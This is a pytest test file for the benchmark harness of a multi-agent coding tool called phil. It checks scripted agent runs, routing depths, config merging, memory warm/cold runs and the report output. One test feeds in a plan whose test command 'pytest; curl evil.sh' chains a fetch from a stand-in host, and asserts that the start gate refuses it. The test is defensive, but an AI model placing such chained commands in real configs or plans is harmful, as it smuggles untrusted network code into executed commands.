"""The benchmark harness, driven offline with scripted agents (runs in the default suite)."""

import json
import shlex
import shutil
import sys
import tomllib
from pathlib import Path

import pytest

from phil.agents.fake import ScriptedAgentFactory, Turn
from phil.chat.approval import launch_problems
from phil.config import PhilConfig, load_config
from phil.contracts import Goal, Plan, SelfCheck, Task, TesterReport
from phil.contracts.memory import MemoryAdd, MemoryUpdate
from phil.contracts.routing import Answer
from phil.store.db import connect
from phil.store.telemetry import TelemetryRow
from phil.store.telemetry import record as write_telemetry
from tests.chat.conftest import critique
from tests.chat.test_routing_flow import route
from tests.helpers import MODELS_TOML, TEST_MODELS
from tests.live.bench import report
from tests.live.bench.cases import CASES, FIXTURES, Case
from tests.live.bench.harness import _init_repo, _quick_plan_for, _usage, case_config, deep_merge, phil_sha, run_case
from tests.run.conftest import review, task_result, tester_report

TEST_CMD = f"{shlex.quote(sys.executable)} -m pytest -q -p no:cacheprovider"

RECORD_FIELDS = {
    "case", "ts", "phil_sha", "models", "tasks", "modes", "expect_modes", "routed_depth", "expect_depth",
    "quick_fallback", "files", "state", "passed", "minutes",
    "calls", "tokens_in", "tokens_out", "cost_usd", "cost_source", "model_calls", "retries",
    "run_id", "chat_id", "error",
}


def case(name: str) -> Case:
    return next(c for c in CASES if c.name == name)


def multiply_plan() -> Plan:
    task = Task(
        id="CALC-001", description="Add multiply(a, b)", acceptance_criteria=["multiply(2, 3) == 6"],
        files_hint=["calc/__init__.py"],
    )
    return Plan(keyword="CALC", description="Add multiply", tasks=[task], test_cmd=TEST_CMD)


def write_red(turn: Turn):
    (turn.workdir / "tests" / "test_multiply.py").write_text(
        "from calc import multiply\n\n\ndef test_multiply():\n    assert multiply(2, 3) == 6\n"
    )
    return task_result("red", ["tests/test_multiply.py"], ["tests/test_multiply.py"])


def write_green(turn: Turn):
    module = turn.workdir / "calc" / "__init__.py"
    module.write_text(module.read_text() + "\n\ndef multiply(a, b):\n    return a * b\n")
    return task_result("green", ["calc/__init__.py"])


def quick_task() -> Task:
    return Task(
        id="CALC-001", description="Add multiply(a, b)", acceptance_criteria=["multiply(2, 3) == 6"],
        files_hint=["calc/__init__.py"],
    )


def quick_goal(objective: str, task: Task | None = None) -> Goal:
    return Goal(objective=objective, depth="quick", task=task if task is not None else quick_task())


def scripted() -> ScriptedAgentFactory:
    return ScriptedAgentFactory({
        "route": [route("feature")],  # DEPTH["feature"] == "full": today's architect path
        "architect": [multiply_plan()],
        "critic": [critique()],
        "implementer": [write_red, write_green],
        "tester": [tester_report()],
        "reviewer": [review()],
    })


@pytest.fixture
def results(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    path = tmp_path / "results.jsonl"
    monkeypatch.setenv("PHIL_BENCH_RESULTS", str(path))
    return path


@pytest.fixture
def config(tmp_path: Path) -> Path:
    path = tmp_path / "bench.toml"
    # The plan's test command is the project's own, so the chat's start gate lets the run start.
    path.write_text(MODELS_TOML + f"\n[project]\ntest_cmd = {json.dumps(TEST_CMD)}\n")
    return path


def test_run_case_appends_one_complete_record(tmp_path, results, config):
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=scripted())
    lines = results.read_text().splitlines()
    assert len(lines) == 1
    assert json.loads(lines[0]) == record
    assert set(record) >= RECORD_FIELDS
    assert record["case"] == "py-multiply"
    assert record["state"] == "completed"
    assert record["passed"] is True
    assert record["error"] is None
    assert (record["tasks"], record["modes"], record["expect_modes"]) == (1, ["tdd"], ["tdd"])
    assert record["models"]["architect"] == "ollama:test-model"
    assert (record["routed_depth"], record["expect_depth"], record["quick_fallback"]) == ("full", "quick", False)
    assert record["files"] == []
    # route, then architect + critic in the chat, then red, green, tester and reviewer in the run
    assert record["calls"] == 7
    assert (record["tokens_in"], record["tokens_out"]) == (700, 140)
    assert (record["model_calls"], record["retries"]) == (0, 0)  # scripted agents make no model calls
    assert record["cost_source"] in ("reported", "estimated", "unknown")
    assert record["chat_id"].startswith("bench-py-multiply-")


def test_run_case_ignores_the_global_config_and_records_resolved_models(tmp_path, results, config, monkeypatch):
    import phil.run.worker
    from phil.config import global_config_path
    from tests.live.bench import harness

    # A global config the benchmark must not see: its [run], [models] and [tiers] would change results.
    global_config_path().parent.mkdir(parents=True, exist_ok=True)
    global_config_path().write_text(
        '[run]\nmax_cost_usd = 7.5\nmax_review_rounds = 5\n[models]\nreviewer = "ollama:global"\n[tiers]\ncritic = "low"\n'
    )
    config.write_text(
        '[models]\nhigh = "ollama:hi"\nlow = "ollama:lo"\n' + f"[project]\ntest_cmd = {json.dumps(TEST_CMD)}\n"
    )
    loaded = []

    def spy(load):
        def wrapper(*args, **kwargs):
            loaded.append(load(*args, **kwargs))
            return loaded[-1]
        return wrapper

    monkeypatch.setattr(harness, "load_config", spy(harness.load_config))
    monkeypatch.setattr(phil.run.worker, "load_config", spy(phil.run.worker.load_config))
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=scripted())
    assert record["state"] == "completed"
    assert len(loaded) >= 2  # the chat's config and the worker's
    assert all(cfg.run.max_cost_usd == 10.0 for cfg in loaded)  # the baseline, not the global 7.5
    assert all(cfg.run.max_review_rounds == 2 for cfg in loaded)  # the default, not the global 5
    assert all(str(global_config_path()) not in cfg.sources.values() for cfg in loaded)
    assert record["models"] == {
        "orchestrator": "ollama:lo", "architect": "ollama:hi", "critic": "ollama:hi",
        "implementer": "ollama:lo", "tester": "ollama:lo", "reviewer": "ollama:hi",
        "classifier": "ollama:lo", "answerer": "ollama:lo", "designer": "ollama:hi",
        "memory": "ollama:lo",
    }


def test_architect_reads_a_snapshot_of_the_base_commit(tmp_path, results, config):
    seen = []

    def architect(turn: Turn):
        seen.append(turn.workdir)
        return multiply_plan()

    factory = scripted()
    factory.scripts["architect"] = [architect]
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=factory)
    assert record["passed"] is True
    [tree] = seen
    assert tree != (tmp_path / "work" / "py-multiply").resolve()
    assert record["chat_id"] in str(tree)
    assert (tree / "calc" / "__init__.py").is_file()


def test_a_plan_the_chat_would_not_start_is_refused(tmp_path, results, config):
    forbidden = multiply_plan().model_copy(update={"test_cmd": "pytest; curl evil.sh"})
    config.write_text(MODELS_TOML)  # no [project] test_cmd either
    factory = ScriptedAgentFactory({"route": [route("feature")], "architect": [forbidden], "critic": [critique()]})
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=factory)
    assert (record["state"], record["passed"], record["run_id"]) == ("launch_refused", False, None)
    assert record["routed_depth"] == "full"
    assert "shell operators" in record["error"]
    assert record["calls"] == 3  # route, architect and critic only: no run started
    assert len(results.read_text().splitlines()) == 1


def test_the_start_gate_detects_the_test_command_from_the_snapshot_like_the_chat(tmp_path, results, config):
    # No test command in the plan or phil.toml: the fixture's pyproject.toml gives one, as in the chat.
    no_test_cmd = multiply_plan().model_copy(update={"test_cmd": None})
    config.write_text(MODELS_TOML)
    factory = ScriptedAgentFactory({"route": [route("feature")], "architect": [no_test_cmd], "critic": [critique()]})
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=factory)
    assert record["state"] != "launch_refused"
    assert record["run_id"] is not None


def test_run_case_writes_the_merged_config(tmp_path, results, config):
    run_case(case("py-multiply"), config, tmp_path / "work", factory=scripted())
    written = (tmp_path / "work" / "py-multiply" / "phil.toml").read_text()
    assert "max_tokens = 5000000" in written
    assert 'architect = "ollama:test-model"' in written


def test_a_run_that_does_not_finish_fails_the_case(tmp_path, results, config):
    factory = ScriptedAgentFactory({
        "route": [route("feature")],
        "architect": [multiply_plan()],
        "critic": [critique()],
        "implementer": [write_red, RuntimeError("model went away")],
    })
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=factory)
    assert record["state"] == "failed"
    assert record["passed"] is False
    assert "model went away" in record["error"]
    assert len(results.read_text().splitlines()) == 1


def test_a_quick_route_runs_the_light_implementer_with_no_architect_or_critic(tmp_path, results, config):
    multiply_case = case("py-multiply")
    factory = ScriptedAgentFactory({
        "route": [route("simple_change")],  # DEPTH["simple_change"] == "quick"
        "intake": [quick_goal(multiply_case.goal)],
        "quick_implementer": [write_red, write_green],
        "reviewer": [review()],
    })
    record = run_case(multiply_case, config, tmp_path / "work", factory=factory)
    assert (record["routed_depth"], record["expect_depth"], record["quick_fallback"]) == ("quick", "quick", False)
    assert record["state"] == "completed"
    assert record["passed"] is True
    assert factory.remaining() == {"route": 0, "intake": 0, "quick_implementer": 0, "reviewer": 0}
    # route + intake in the chat, then red, green and reviewer in the run: no architect, no critic, no tester
    assert record["calls"] == 5


def test_quick_plan_for_detects_setup_even_when_the_test_cmd_is_already_set(tmp_path, monkeypatch):
    # `_detection_root` exports the snapshot whenever setup_cmd isn't set in phil.toml, even if the
    # test command already is: mirrored here so the harness flags the same start-gate problems the
    # chat would (brief R3, Task 3). Only `npm` is missing, so a problem here can only come from the
    # detected setup command, not from the already-configured `make test`.
    monkeypatch.setattr("phil.chat.approval._which", lambda prog: None if prog == "npm" else f"/usr/bin/{prog}")
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "package.json").write_text("{}")
    (tree / "package-lock.json").write_text("{}")
    config = PhilConfig.model_validate({"models": TEST_MODELS, "project": {"test_cmd": "make test"}})
    goal = Goal(
        objective="Add a build script to the site.", depth="quick",
        task=Task(id="SITE-001", description="d", acceptance_criteria=["c"]),
    )
    plan, problems = _quick_plan_for(goal, config, tree, tmp_path)
    assert plan is None
    assert any("npm ci" in problem and "isn't on PATH" in problem for problem in problems)


def test_quick_plan_for_skips_detection_once_both_commands_are_configured(tmp_path, monkeypatch):
    monkeypatch.setattr("phil.chat.approval._which", lambda prog: None if prog == "npm" else f"/usr/bin/{prog}")
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "package.json").write_text("{}")
    (tree / "package-lock.json").write_text("{}")
    config = PhilConfig.model_validate(
        {"models": TEST_MODELS, "project": {"test_cmd": "make test", "setup_cmd": ""}}
    )
    goal = Goal(
        objective="Add a build script to the site.", depth="quick",
        task=Task(id="SITE-001", description="d", acceptance_criteria=["c"]),
    )
    plan, problems = _quick_plan_for(goal, config, tree, tmp_path)
    assert problems == []
    assert plan is not None and plan.test_cmd == "make test"


def test_a_quick_route_without_a_task_falls_back_to_full_planning(tmp_path, results, config):
    multiply_case = case("py-multiply")
    factory = ScriptedAgentFactory({
        "route": [route("simple_change")],
        "intake": [Goal(objective=multiply_case.goal, depth="quick")],  # no task: the quick plan can't be made
        "architect": [multiply_plan()],
        "critic": [critique()],
        "implementer": [write_red, write_green],
        "tester": [tester_report()],
        "reviewer": [review()],
    })
    record = run_case(multiply_case, config, tmp_path / "work", factory=factory)
    assert (record["routed_depth"], record["quick_fallback"]) == ("quick", True)
    assert record["state"] == "completed"
    assert record["passed"] is True


def test_an_answer_route_asks_the_answerer_and_starts_no_run(tmp_path, results, config):
    explain = case("explain-module")
    factory = ScriptedAgentFactory({
        "route": [route("question")],  # DEPTH["question"] == "answer"
        "answer": [Answer(text="It raises ZeroDivisionError.", files=["calc/__init__.py"])],
    })
    record = run_case(explain, config, tmp_path / "work", factory=factory)
    assert (record["routed_depth"], record["expect_depth"]) == ("answer", "answer")
    assert record["run_id"] is None
    assert record["state"] == "answered"
    assert record["files"] == ["calc/__init__.py"]
    assert record["passed"] is True  # no new commits, and the expected file is cited
    assert factory.remaining() == {"route": 0, "answer": 0}


def test_an_answer_that_does_not_cite_the_expected_file_fails_the_case(tmp_path, results, config):
    explain = case("explain-module")
    factory = ScriptedAgentFactory({
        "route": [route("question")],
        "answer": [Answer(text="It raises ZeroDivisionError.", files=["README.md"])],
    })
    record = run_case(explain, config, tmp_path / "work", factory=factory)
    assert record["passed"] is False


def _telemetry_row(**overrides) -> TelemetryRow:
    base = dict(
        run_id=None, layer="chat", node="n", role="r", model="m", attempt=1, packet_tokens=1,
        input_tokens=10, output_tokens=5, latency_ms=1, cost_usd=0.01, outcome="ok", call=1,
        chat_id=None, model_calls=0,
    )
    return TelemetryRow(**(base | overrides))


def test_usage_sums_model_calls_across_chat_and_run_layer_rows(tmp_path):
    # A run's telemetry carries no chat_id (phil.store.db SCHEMA), so the sum must match on
    # run_id directly rather than through a `runs` subselect.
    conn = connect(tmp_path / "bench.db")
    write_telemetry(conn, _telemetry_row(chat_id="chat-1", model_calls=2))
    write_telemetry(conn, _telemetry_row(layer="run", run_id="run-1", model_calls=3))
    write_telemetry(conn, _telemetry_row(chat_id="other-chat", model_calls=7))  # a different chat: excluded
    usage = _usage(conn, "chat-1", "run-1")
    assert usage["calls"] == 2
    assert usage["model_calls"] == 5


def test_deep_merge_keeps_the_baseline_under_the_config():
    base = {"run": {"max_tokens": 5, "max_cost_usd": 10.0}}
    merged = deep_merge(base, {"run": {"max_tokens": 7}, "models": {"critic": "x"}})
    assert merged == {"run": {"max_tokens": 7, "max_cost_usd": 10.0}, "models": {"critic": "x"}}
    assert base == {"run": {"max_tokens": 5, "max_cost_usd": 10.0}}


@pytest.mark.parametrize("name", ["site-meta-tag", "site-typo"])
def test_site_cases_configure_the_build_as_the_test_command(tmp_path, name):
    site_case = case(name)
    user = tomllib.loads(MODELS_TOML + '[run]\nmax_cost_usd = 3.0\n[project]\ntest_cmd = "npm test"\n')
    root = _init_repo(site_case, tmp_path / "work", case_config(site_case, user))
    config = load_config(root)
    assert config.project.test_cmd == "node build.mjs"  # the case's override wins
    assert (config.run.max_tokens, config.run.max_cost_usd) == (5_000_000, 3.0)
    # A plan without a test command (the site has no test script) passes the chat's start gate.
    assert launch_problems(multiply_plan().model_copy(update={"test_cmd": None}), config) == []


def test_phil_sha_is_unknown_outside_git(tmp_path):
    assert phil_sha(tmp_path) == "unknown"
    assert phil_sha(Path(__file__).parent) not in ("", "unknown")


def test_report_prints_the_last_records_per_case(tmp_path, results, config, capsys):
    run_case(case("py-multiply"), config, tmp_path / "work", factory=scripted())
    capsys.readouterr()
    report.main(["--last", "3"])
    out = capsys.readouterr().out
    assert "py-multiply" in out and "completed" in out and "tdd" in out


def test_report_says_when_there_are_no_results(results, capsys):
    report.main([])
    assert "no benchmark results" in capsys.readouterr().out


def learning_factory() -> ScriptedAgentFactory:
    """A scripted run whose tester leaves a memory note and whose memory agent turns it into one bullet."""
    noting = SelfCheck(
        assumptions=[], evidence=[], risks=[], unverified=[], out_of_scope=[],
        memory_notes=["tests run with python -m pytest -q"],
    )
    factory = scripted()
    factory.scripts["tester"] = [TesterReport(tests_added=[], issues=[], self_check=noting)]
    factory.scripts["memory"] = [
        MemoryUpdate(add=[MemoryAdd(section="Commands", text="Run the tests with python -m pytest -q")])
    ]
    return factory


def test_a_cold_run_then_a_warm_run_on_the_same_repo_both_pass(tmp_path, results, config):
    work = tmp_path / "work"
    calc = case("py-multiply")
    cold = run_case(calc, config, work, factory=learning_factory(), memory="cold", pair=0)
    assert cold["passed"] is True
    assert (cold["memory"], cold["pair"], cold["memory_bullets"]) == ("cold", 0, 0)
    leftover = work / "py-multiply" / "leftover.txt"
    leftover.write_text("from the cold run\n")  # untracked: a reused repo must not keep it
    warm = run_case(calc, config, work, factory=scripted(), memory="warm", pair=0, reuse_repo=True)
    assert warm["passed"] is True
    assert not leftover.exists()
    assert (warm["memory"], warm["pair"]) == ("warm", 0)
    # what the cold run's memory agent added is what the warm run starts with
    assert warm["memory_bullets"] == 1
    assert len(results.read_text().splitlines()) == 2


def test_a_cold_run_starts_without_the_memory_an_earlier_run_left(tmp_path, results, config):
    work = tmp_path / "work"
    calc = case("py-multiply")
    run_case(calc, config, work, factory=learning_factory(), memory="cold", pair=0)
    again = run_case(calc, config, work, factory=scripted(), memory="cold", pair=1, reuse_repo=True)
    assert again["memory_bullets"] == 0


def test_a_record_without_a_memory_mode_has_no_memory_fields(tmp_path, results, config):
    record = run_case(case("py-multiply"), config, tmp_path / "work", factory=scripted())
    assert not {"memory", "pair", "memory_bullets"} & set(record)


def test_planning_agents_get_the_repo_context_block(tmp_path, results, config):
    contexts: dict[str, str] = {}

    class Recording(ScriptedAgentFactory):
        def __call__(self, spec, *args, **kwargs):
            contexts[spec.name] = spec.context
            return super().__call__(spec, *args, **kwargs)

    work = tmp_path / "work"
    run_case(case("py-multiply"), config, work, factory=learning_factory(), memory="cold", pair=0)
    warm = Recording(scripted().scripts)
    run_case(case("py-multiply"), config, work, factory=warm, memory="warm", pair=0, reuse_repo=True)
    assert "## Repo context" in contexts["architect"]
    assert "Run the tests with python -m pytest -q" in contexts["architect"]


def test_the_cold_against_warm_section_uses_medians_over_the_last_pairs():
    def rec(memory, calls, tokens, minutes, case_name="a"):
        return {
            "case": case_name, "memory": memory, "model_calls": calls,
            "tokens_in": tokens, "tokens_out": 10, "minutes": minutes,
        }

    records = [
        rec("cold", 99, 999, 9.0),  # older than the last two pairs: ignored
        rec("cold", 10, 100, 2.0), rec("warm", 4, 40, 1.0),
        rec("cold", 20, 200, 4.0), rec("warm", 6, 60, 1.0),
        rec("cold", 0, 0, 0.0, "b"), rec("warm", 3, 30, 1.0, "b"),
    ]
    header, a_row, b_row = report.cold_against_warm(records, pairs=2)
    assert header == (
        "case", "cold calls", "warm calls", "change", "cold tokens", "warm tokens", "change",
        "cold min", "warm min", "change",
    )
    # cold calls 10 and 20 -> 15, warm 4 and 6 -> 5; tokens (110, 210) -> 160, (50, 70) -> 60; minutes 3.0 and 1.0
    assert a_row == ("a", "15", "5", "-67%", "160", "60", "-62%", "3.0", "1.0", "-67%")
    assert b_row == ("b", "0", "3", "n/a", "10", "40", "+300%", "0.0", "1.0", "n/a")


@pytest.mark.parametrize(
    ("cold", "warm", "text"),
    [(100, 66, "-34%"), (100, 100, "0%"), (100, 150, "+50%"), (0, 5, "n/a"), (0, 0, "n/a"), (3, 2, "-33%")],
)
def test_change_is_a_whole_percent_or_not_applicable(cold, warm, text):
    assert report.change(cold, warm) == text


def test_report_adds_the_mem_column_and_the_cold_against_warm_section(results, capsys):
    base = {"case": "a", "state": "completed", "passed": True, "model_calls": 8, "tokens_in": 5, "tokens_out": 5}
    records = [
        {**base, "memory": "cold", "pair": 0, "minutes": 2.0},
        {**base, "memory": "warm", "pair": 2, "model_calls": 4, "minutes": 1.0},
        {**base, "case": "plain"},
    ]
    results.write_text("".join(json.dumps(r) + "\n" for r in records))
    report.main(["--pairs", "3"])
    lines = capsys.readouterr().out.splitlines()
    assert lines[0].split()[:3] == ["case", "sha", "mem"]
    assert "cold#0" in lines[1] and "warm#2" in lines[2]
    assert lines[3].split()[2] == "-"
    assert "Cold against warm (medians over the last 3 pairs)" in "\n".join(lines)


def test_report_without_memory_records_has_no_cold_against_warm_section(results, capsys):
    results.write_text(json.dumps({"case": "a", "state": "completed", "passed": True}) + "\n")
    report.main([])
    assert "Cold against warm" not in capsys.readouterr().out


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_site_checks_fail_on_the_fixture_and_pass_when_fixed(tmp_path):
    site = tmp_path / "site"
    shutil.copytree(FIXTURES / "static-site", site)
    assert not case("site-typo").passed(site)
    assert not case("site-meta-tag").passed(site)
    index = site / "src" / "index.html"
    index.write_text(index.read_text().replace("Welcom ", "Welcome "))
    layout = site / "src" / "layout.html"
    layout.write_text(layout.read_text().replace("</head>", '<meta name="easter-egg" content="hello world"></head>'))
    assert case("site-typo").passed(site)
    assert case("site-meta-tag").passed(site)


def test_py_check_fails_until_multiply_exists(tmp_path):
    calc = tmp_path / "calc"
    shutil.copytree(FIXTURES / "py-calc", calc)
    assert not case("py-multiply").passed(calc)
    module = calc / "calc" / "__init__.py"
    module.write_text(module.read_text() + "\n\ndef multiply(a, b):\n    return a * b\n")
    assert case("py-multiply").passed(calc)
